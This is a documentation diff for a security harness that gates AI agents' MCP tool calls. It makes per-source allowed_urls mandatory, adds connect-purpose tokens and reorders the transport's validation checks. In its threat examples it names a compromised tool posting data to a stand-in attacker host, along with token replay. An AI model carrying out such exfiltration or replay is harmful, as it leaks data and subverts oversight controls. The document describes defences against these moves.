@@ -11,8 +11,9 @@ allowed tool call carries a signed, one-shot, source-bound token that a
 custom HTTP transport validates on every request. This closes the gap
 between "the gate said yes" and "what actually went out on the network."
 
-Both features are opt-in and independent. You can onboard manifests without
-connectivity, connectivity with local sources, or both.
+Both run together: connectivity is always on, every MCP source runs through
+`ShaiTransport`, and local tools check their own token through
+`verify_tool_dispatch` (see [integrations.md](integrations.md)).
 
 ## MCP manifests
 
@@ -61,6 +62,13 @@ tools:
     tags: [read, messaging]
     action: allow
 ```
+
+`allowed_urls` is required: a non-empty list of URL patterns, each with a host
+SHAI canonicalizes. It is the complete set of destinations the source reaches —
+`ShaiTransport` checks every request against it, onboarding approves it with
+the rest of the manifest, and every dispatch token for the source is bound to
+it. `shai mcp onboard` and startup refuse a manifest whose list is missing,
+empty or malformed.
 
 `action` is `allow` or `block`, and it is enforced. At startup each
 `action: block` compiles to an ordinary deny rule that the existing policy
@@ -154,7 +162,7 @@ webhook URL, a callback, a fetch target — where the destination isn't fixed
 by the manifest at all. For that, give the tool's `ArgumentRule` a
 `scope_policy`: it canonicalizes the argument value as a URL (case, IDNA,
 and IP-literal-encoding differences folded to what the network stack would
-actually dial — see `THREAT_MODEL.md`'s T8 residual-risk note) and denies
+actually dial — see the ASI02 limits in `THREAT_MODEL.md`) and denies
 the call unless the resulting host is in scope.
 
 Argument rules are declared in code, on the tool. Neither agent YAML nor an
@@ -242,30 +250,37 @@ gate = await harness.check_tool_call(tool_name, args, ctx)
 #   - agent_id
 #   - tool_name
 #   - source_name  (which MCP source this call is destined for)
+#   - purpose      (tool_call — one tools/call)
 #   - allowed_urls (from the source's manifest)
 #   - allowed_methods
 #   - expires_at   (15s by default)
 #   - token_id     (UUID nonce for one-time use)
 ```
 
-Your MCP HTTP client is `ShaiTransport` — an `httpx.AsyncBaseTransport` subclass that:
+Each connect-phase request an MCP source sends — the SSE `GET`, `initialize`,
+`notifications/initialized`, `tools/list` — carries a token of its own with
+`purpose: connect`, minted from the source's onboarding approval just before
+the request.
 
-1. Extracts the token from the outgoing request context.
-2. Verifies the signature against `token_secret`.
-3. Checks that the request URL matches one of the token's `allowed_urls`.
-4. Checks the HTTP method is in `allowed_methods`.
-5. Checks the source binding — a token issued for `slack` cannot be used to reach `github`.
-6. Checks the nonce hasn't been used before.
+Your MCP HTTP client is `ShaiTransport` — an `httpx.AsyncBaseTransport` subclass that, in order:
+
+1. Checks the request URL against the source's `allowed_urls` and the method against its `allowed_methods`.
+2. Extracts the token from the outgoing request and verifies its signature and expiry against `token_secret`.
+3. Checks the source binding — a token issued for `slack` reaches `slack` only.
+4. Checks the purpose — a connect token passes on the four connect-phase requests, a tool-call token on `tools/call`.
+5. Checks that the request URL matches one of the token's `allowed_urls` and the method is in its `allowed_methods`.
+6. Checks that the nonce is unused.
 7. Injects the `X-Shai-Token` header, forwards the request, and emits a `NetworkAuditEvent`.
 
-Anything that fails validation is refused at the transport layer — the request never reaches the network. If the same token is replayed, the nonce check refuses it.
+A request that fails any check is refused at the transport layer, with a `denied` `NetworkAuditEvent`, before it reaches the network.
 
 ### What this protects
 
-- A compromised tool implementation that tries to `httpx.post("https://attacker.example/", ...)` — refused at step 3, URL not in `allowed_urls`.
-- A tool that was gated for `slack` but tries to reach GitHub's API — refused at step 5, source binding mismatch.
+- A compromised tool implementation that tries to `httpx.post("https://attacker.example/", ...)` — refused at step 1, URL outside `allowed_urls`.
+- A tool that was gated for `slack` but tries to reach GitHub's API — refused at step 3, source binding mismatch.
+- A connect token presented on a tool call — refused at step 4.
 - A replay attack that captures a valid token and reuses it — refused at step 6, nonce spent.
-- A token that survives past the tool's return — refused at step 5 in most cases and at step 6 in others; the 15s TTL is a defence in depth.
+- A token that survives past the tool's return — refused at step 6 once used, and at step 2 once expired; the 15s TTL is defence in depth.
 
 ### Containment: stopping an agent's outbound traffic
 
